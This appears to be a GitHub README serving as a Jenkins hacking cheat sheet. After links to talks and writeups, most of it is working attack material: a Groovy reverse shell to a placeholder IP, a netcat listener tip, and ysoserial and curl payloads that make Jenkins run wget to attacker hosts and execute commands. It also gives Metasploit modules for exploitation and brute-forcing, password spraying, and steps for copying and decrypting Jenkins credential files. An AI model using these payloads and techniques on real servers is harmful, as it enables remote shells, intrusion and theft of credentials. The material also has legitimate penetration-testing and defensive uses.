# Secure-or-Break-Jenkins
## Hack Jenkins! it's sweet
![](https://e5s6t7j5.rocketcdn.me/wp-content/uploads/2022/02/Jenkins-Best-Security-Practices.png)

### Talks
[BlackHat USA 2022](https://www.youtube.com/watch?v=Pe9nJLZvABM)

[Hacking Jenkins - Orange Tsai](https://www.youtube.com/watch?v=_x8BsBnQPmU)

[Best Practices for securing CI/CD Pipelines](https://www.youtube.com/watch?v=i3Bx1iSzrUY)

[CI/CD Pipeline Security - AWS](https://www.youtube.com/watch?v=BprhSs1eSWw)

### Writeup
[RCE in Jenkins](https://faizal-ctf.notion.site/Jenkins-Remote-Execution-Via-Malicious-Jobs-1247f23b95f043c08e5e7e0c183223ad?pvs=4)

[Secure Jenkins CI/CD by Crowdstrike](https://www.crowdstrike.com/blog/tech-center/securing-your-jenkins-ci-cd-container-pipeline-with-crowdstrike/)

[Story of a Hundred Vulnerable Jenkins Plugins](https://research.nccgroup.com/2019/05/02/story-of-a-hundred-vulnerable-jenkins-plugins/)

[Exploiting Jenkins Groovy Script Console in Multiple Ways](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/)

## Extras
Reverse shell from Groovy
-------------------------
```m
In the left sidebar, navigate to "Manage Jenkins" > "Script Console", or just go to $rhost:8080/script

```


```java
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

I'll leave this reverse shell tip to have a fully working PTY here in case anyone needs it , so dont do just nc -nlvp port instead do this :

```bash
stty raw -echo; (echo 'script -qc "/bin/bash" /dev/null';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp port && reset
```
Groovy Scripts
==============
Decrypt Jenkins secrets from Groovy
-----------------------------------

```java
println(hudson.util.Secret.decrypt("{...}"))
```


Command execution from Groovy
-----------------------------

```java
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```
#### MSF exploit
**You can use MSF to get a reverse shell :

```bash
msf> use exploit/multi/http/jenkins_script_console
```
#### Bruteforce
**Jekins does not implement any password policy or username brute-force mitigation. 
Then, you should always try to brute-force users because probably weak passwords are being used (even usernames as passwords or reverse usernames as passwords).

```bash
msf> use auxiliary/scanner/http/jenkins_login
```
=====================

Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
---------------------------------------------------------------------------
Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```


Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
--------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2018-12-05/)

Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
```bash
curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
```


Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)
---------------------------------------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-01-08)

Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).

Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).


CheckScript RCE in Jenkins (CVE-2019-1003029, CVE-2019-1003030)
---------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-03-06/), [Credits](https://twitter.com/webpentest).

Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
```

Execute arbitraty bash commands:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute()}}'
```

If you don't immediately get a reverse shell you can debug by throwing an exception:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
```

Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
----------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-09-12/), [Credits](https://iwantmore.pizza/posts/cve-2019-10392.html).

This one will only work is a user has the 'Jobs/Configure' rights in the security matrix so it's very specific.


CorePlague (CVE-2023-27898, CVE-2023-27905)
-------------------------------------------
[Jenkins Advisory](https://www.jenkins.io/security/advisory/2023-03-08/), [Credits](https://blog.aquasec.com/jenkins-server-vulnerabilities)

Note that this is only exploitable if using a *dedicated* and out-of-date [Update Center](https://www.jenkins.io/templates/updates/). Therefore most servers are not vulnerable.


Password spraying
=================

Use [this python script](./password_spraying/jenkins_password_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).


Files to copy after compromission
=================================

These files are needed to decrypt Jenkins secrets:

* secrets/master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

* credentials.xml
* jobs/.../build.xml

Here's a regexp to find them:
```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
```


Decrypt Jenkins secrets offline
===============================

Use [this script](./offline_decryption/jenkins_offline_decrypt.py) to decrypt previsously dumped secrets.

```
Usage:
	jenkins_offline_decrypt.py <jenkins_base_path>
or:
	jenkins_offline_decrypt.py <master.key> <hudson.util.Secret> [credentials.xml]
or:
	jenkins_offline_decrypt.py -i <path> (interactive mode)
```
